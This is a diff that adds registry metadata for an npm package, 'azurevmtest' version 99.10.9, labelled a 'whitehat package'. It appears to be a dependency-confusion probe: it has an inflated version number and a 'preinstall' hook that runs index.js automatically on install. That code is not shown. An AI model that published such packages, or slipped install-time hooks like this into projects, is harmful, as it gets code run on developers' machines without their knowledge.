@@ -1,0 +1,39 @@
+{
+    "name": "azurevmtest",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azurevmtest@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-P3uPI6yR9z+jJXss/H6SXNk/w1vMOnOKWWHxRFC9cHCiGZqJk6UoIC0NAYFaGOhpXPLTQ9jC4FnttO2xSaJpKw==",
+        "shasum": "78f715b6b132ca0ce995134fc85fe0c85cb93320",
+        "tarball": "https://registry.npmjs.org/azurevmtest/-/azurevmtest-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3575,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRCNCRA9TVsSAnZWagAAw7cP/3yPA8s5dSJeD+M/X9EC\nG0uFTJGHZZyZyCWNd6dI1rMxkyf1k/btMcUyVMtvOYYDVF92R8h4f7NHIS/9\nfPsVzCDbpeSN2CuPlSznBDhF+vHPU4d9uNXdD+8Gfjtcp4gBenmIjwAtZbvJ\nxPDjTttOiGLeIo6LiaS+QmNIrwomuhy6HXEdk6Zp1hST62v1dIdNOzyjJx5m\nXGOZrZ1mWfQiFifqxu194QXxXZwVsAxOa4lJz6YJ78DUMNoqG+j0AjFaFuL4\nrrv8i2CU6ryQQiWL2VTsiMovCzkFb5QUl/cPPaL5z5g+2gGK913PapPX2Low\n/ZVi02JFX6XoKQgy1HQikO4IYq0wLo6dyEttP1DdZK5YSvy2rIx0QkzoZrka\nSX+eyBtN6JJIo71Iw3+IMYyC8zZAgaUzXSXyqPlTnbdRMelE6SFTWIsyybd3\n+9aiu5wPZQ3NRRo9VomQAfAVCPKeTmgro33T3fvzGC54e1ONBSANAgfXSLI4\nVIPNvWBaFA18hbJjehBjO8uBmOmScXHbwY2iw0NOSArOImPHe8GO6CiGV0c+\nmJAcbRvMkQm/Ip5WAFr4zoblNXuzbtVuZNaDt5CB/Jj4dMWSODQKFvXZ5pEq\nkXs5fSdImkLUfA12zI7qyw0bktySoo/8JmIPzeZYAaqB/3aSwpHOcIhO1X0c\nMrhx\r\n=MeeM\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azurevmtest_99.10.9_1637945485758_0.7119896878379992"
+    },
+    "_hasShrinkwrap": false
+}
